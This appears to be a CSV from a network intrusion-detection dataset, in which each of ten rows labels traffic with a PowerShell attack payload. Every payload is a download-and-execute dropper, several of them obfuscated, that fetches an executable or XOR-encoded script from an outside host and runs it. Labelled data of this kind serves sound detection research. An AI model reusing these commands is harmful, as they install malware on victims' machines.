field,src,dst,p_src,p_dst,proto,attack,length [packet],length [bit]
TIMING,109.196.225.86,203.139.121.234,52816,30303,6,"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/tpaesb.exe',""$env:TEMP\Payment.exe"");Start-Process (""$env:TEMP\Payment.exe"")
",1153,1153
TIMING,203.139.113.8,100.163.44.160,80,62112,6,"[SYsteM.NeT.ServICePOiNTMANagER]::EXPECT100ConTinUe = 0;$WC=NEw-ObjECT SYSTEM.NEt.WEBCliENT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$Wc.HeaDERs.ADD('User-Agent',$u);$wC.PROXY = [SyStem.NeT.WEbREqueST]::DeFAulTWEBPRoxy;$WC.PRoxY.CRedeNtiALS = [SYSTEm.Net.CReDeNTIaLCaChE]::DEfAUltNeTwoRKCReDEnTIaLS;$K='E!7y2[}J?CrG/aqH*5WZ4@o^_BYg(#6I';$I=0;[cHAr[]]$b=([CHAr[]]($Wc.DowNlOadStRINg(""http://14.144.144.66:8081/index.asp"")))|%{$_-BXor$k[$I++%$K.LenGtH]};IEX ($b-JoIN'')
",4009,4009
TIMING,203.139.118.176,58.48.198.40,80,49708,6,"$wc=NeW-OBjeCT SYsTem.Net.WEbClieNT;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeadeRS.AdD('User-Agent',$u);$WC.PrOxy = [SySTEm.NET.WeBREqUeSt]::DEfAuLtWeBPrOXY;$wC.PrOxy.CredEnTiALs = [SYsTEM.NEt.CredenTiALCACHE]::DeFAUlTNETWORKCrEdENtiaLS;$K='m.]kjJd[SBY3&Le*<2xqzl6{Pr?s8)hC';$I=0;[chaR[]]$B=([cHaR[]]($WC.DOwNlOADStRing(""http://222.230.139.166:80/index.asp"")))|%{$_-bXor$K[$I++%$K.LENgTH]};IEX ($b-joiN'')
",3561,3561
TIMING,13.5.165.135,203.139.121.234,30303,59386,6,"function JDdRbrGihkZnAeTb ( $jCrpFRvHpdVDoyMZzK , $dlYHmHZlPGmNrLqEskalvrHWbxWDt ){(New-Object System.Net.WebClient).DownloadFile( $jCrpFRvHpdVDoyMZzK , $dlYHmHZlPGmNrLqEskalvrHWbxWDt );(New-Object -com Shell.Application).ShellExecute( $dlYHmHZlPGmNrLqEskalvrHWbxWDt ); }
",2177,2177
TIMING,130.85.161.127,203.139.121.234,30303,50356,6,"function kCWxhwCDssgbQyNJJDYZY ( $ObptwaDLLxGOwD , $gkYtNjIlmzPZVDtSrvZWWbhDlVz ){(New-Object System.Net.WebClient).DownloadFile( $ObptwaDLLxGOwD , $gkYtNjIlmzPZVDtSrvZWWbhDlVz );(New-Object -com Shell.Application).ShellExecute( $gkYtNjIlmzPZVDtSrvZWWbhDlVz ); }
",2105,2105
TIMING,135.177.15.99,203.139.121.234,30303,49024,6," sleep 1;(.'new-object' 'system.net.webclient').('downloadfile').Invoke('https://h7de6mkn678k.tk/trasmetto','%localappdata%.exe');&'start-process' '%localappdata%.exe'
",1345,1345
TIMING,135.177.98.249,203.139.121.234,50322,30303,6,"(New-Object System.Net.WebClient).DownloadFile('http://doc.cherrycoffeeequipment.com/nw/logo.png',""$env:TEMP\grtsndebdgfsytewrw.exe"");Start-Process (""$env:TEMP\grtsndebdgfsytewrw.exe"")
",1481,1481
TIMING,138.164.245.77,203.139.121.234,56993,30303,6,"(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/dwnysn.exe',""$env:TEMP\Dropbox.exe"");Start-Process (""$env:TEMP\Dropbox.exe"")
",1153,1153
TIMING,145.225.239.255,203.139.121.234,56944,30303,6,"$7d0mK6 = [TyPE]'ENvIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::GETfoLderpaTh('Desktop');(&'New-Object' 'System.nET.wEBCLIEnT').DOwNLoADFile.iNvoKE('https://hawkgrute.men/atrvs','$Des\5733409.exe');&'Start-Process' $Des\5733409.exe
",1841,1841
TIMING,168.247.233.24,203.139.121.234,52874,30303,6,"$7d0mK6 = [TyPE]'ENVIronmENt' ; &'sleep' 33;${Des} = $7d0mk6::gEtfoLdeRpATh('Desktop');(&'New-Object' 'System.Net.WebClient').dowNLoADFilE.iNVoKE('http://mokerton.com/syope','$Des\7187671.exe');&'Start-Process' $Des\7187671.exe
",1825,1825
